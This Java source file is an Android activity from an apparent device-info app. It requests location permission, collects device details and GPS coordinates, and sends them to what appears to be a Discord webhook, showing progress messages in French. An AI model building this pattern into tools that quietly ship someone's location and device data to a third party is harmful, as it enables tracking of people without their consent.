package com.jzs.deviceinfo;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final int LOCATION_PERMISSION_CODE = 100;
    private DeviceInfoCollector collector;
    private TextView infoText;
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION);

        setContentView(R.layout.activity_main);

        infoText = findViewById(R.id.infoText);
        statusText = findViewById(R.id.statusText);
        collector = new DeviceInfoCollector(this);

        infoText.setText(collector.collectAll());

        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fetchLocationAndSend();
        } else {
            requestPermissions(
                    new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION},
                    LOCATION_PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == LOCATION_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                fetchLocationAndSend();
            } else {
                sendWithoutLocation();
            }
        }
    }

    private void fetchLocationAndSend() {
        statusText.setText("Localisation en cours...");
        statusText.setTextColor(0xFF999999);

        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        if (lm == null) {
            sendWithoutLocation();
            return;
        }

        try {
            Location lastKnown = null;
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            if (lastKnown == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lastKnown = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (lastKnown != null) {
                sendWithLocation(lastKnown.getLatitude(), lastKnown.getLongitude());
                return;
            }

            String provider = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
                    ? LocationManager.GPS_PROVIDER
                    : LocationManager.NETWORK_PROVIDER;

            lm.requestSingleUpdate(provider, new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendWithLocation(location.getLatitude(), location.getLongitude());
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}

                @Override
                public void onProviderEnabled(String provider) {}

                @Override
                public void onProviderDisabled(String provider) {
                    sendWithoutLocation();
                }
            }, getMainLooper());

            // Timeout: if no location after 15s, send without
            infoText.postDelayed(() -> {
                if (statusText.getText().toString().contains("Localisation")) {
                    sendWithoutLocation();
                }
            }, 15000);

        } catch (SecurityException e) {
            sendWithoutLocation();
        }
    }

    private void sendWithLocation(double lat, double lon) {
        String locationLine = String.format("\n📍 Position: %.6f, %.6f", lat, lon);
        String mapsUrl = String.format("https://www.google.com/maps?q=%.6f,%.6f", lat, lon);
        locationLine += "\n🗺 Carte: " + mapsUrl;

        infoText.setText(collector.collectAll() + locationLine);

        statusText.setText("Envoi en cours...");
        statusText.setTextColor(0xFF999999);

        WebhookSender.send(
                collector.getDeviceName(),
                collector.collectForDiscord(),
                lat, lon,
                (success, message) -> {
                    statusText.setText(message);
                    statusText.setTextColor(success ? 0xFF00FF00 : (int) 0xFFFF0040L);
                });
    }

    private void sendWithoutLocation() {
        statusText.setText("Envoi en cours (sans GPS)...");
        statusText.setTextColor(0xFF999999);

        WebhookSender.send(
                collector.getDeviceName(),
                collector.collectForDiscord(),
                Double.NaN, Double.NaN,
                (success, message) -> {
                    statusText.setText(message);
                    statusText.setTextColor(success ? 0xFF00FF00 : (int) 0xFFFF0040L);
                });
    }
}
